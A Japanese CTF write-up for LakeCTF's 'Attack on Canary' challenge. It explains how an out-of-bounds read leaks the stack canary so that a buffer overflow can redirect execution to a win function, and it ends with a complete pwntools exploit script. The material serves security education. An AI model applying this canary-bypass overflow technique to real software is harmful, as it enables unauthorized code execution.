---
title: "Lakectf Attack on Canary Writeups"
tags: ["ctf", "ハッキング"]
keywords: ["pwn", "canary"]
description: "LakectfのAttack on Canaryのwriteupです。"
cover: "img/canary.png"
date: 2022-09-26T21:24:13+09:00
draft: false
---

## 概要
実行可能ファイルが配られるので、実行アドレスをwin関数に飛ばしたらflagが得られるよという問題です。

![problem](img/canary.png)

## バイナリ解析
ghidraでディスアセンブリ/デコンパイルすると次のような結果になりました。

![disassemble](img/disas.png)

このプログラムは、プレイヤーに次の操作を可能にしています。

- 配列(RBP-0x60)に格納されている値を8バイト単位で見ることができる。実はその配列の範囲を超えた部分も見られる。(以下、操作0)
- 配列に好きな値を代入できる。"max 8 bytes"とあるが、実際には好きな長さの値を代入できる。(以下、操作1)

## 攻撃の方針
もちろん最終目的は、win関数の実行です。先ほどの通り、好きな大きさのデータを代入できるので、バッファオーバーフローが使えそうです。

しかし、障害が一つ。canaryの存在です。

バッファオーバーフローとは、プログラムが「次にここを実行しよう！」と思っている場所(RIP/EIP)を書き換えることで、プログラムの実行を任意に操作する手法です。

しかし、我々がデータを注入できる場所とRIPの間にはcanaryというデータがあります。

もちろん、バッファオーバーフロー時にはcanaryの値はメチャクチャになりますから、関数の実行前後でcanaryの値が変わっていた場合はプログラムが強制終了されます。つまり攻撃が失敗します。

さて、これを回避するためにはどうすればよいでしょうか。もしcanaryの値が判明すれば、バッファオーバーフロー時にcanaryの部分だけ変わらないようにpayloadを作れますね。

ここで使えるのが先ほどの機能です。

まず、データを覗き見られる操作0を実行します。canaryのアドレスは[RBP-0x8]なので、我々が操作できる配列との差は $ 0x60 - 0x8 = 88 $。
よって、"Tell me which slot you wanna read: "と聞かれたときには"11"と答えればcanaryが覗き見られますね。

あとはretまでのoffsetを計算してwin関数を実行するだけです。

## スクリプト
結論としては以下のスクリプトで問題が解けました。
```python
from pwn import *

win = 0x0000000000400837

def exec_command(io, cmd: bytes):
    io.recvuntil(b"Your command: ")
    io.sendline(cmd)

io = process("./exe")
#io = remote("chall.polygl0ts.ch", 6100)

exec_command(io, b"0")

io.recvuntil(b"Tell me which slot you wanna read: ")
io.sendline(b"11")

canary = io.recv(8)
log.info(f"canary: {canary}")

payload = b"A"*88
payload += canary
payload += b"A" * 8
payload += p64(win)

exec_command(io, b"1")

io.recvuntil(b"Tell me how much you wanna write: ")
io.sendline(b"112") # 88 + 8 (canary) + 8 (ret) + 8 (win)

io.recvuntil(b"What are the contents (max 8 bytes): ")
io.sendline(payload)

exec_command(io, b"2")

io.interactive()
```

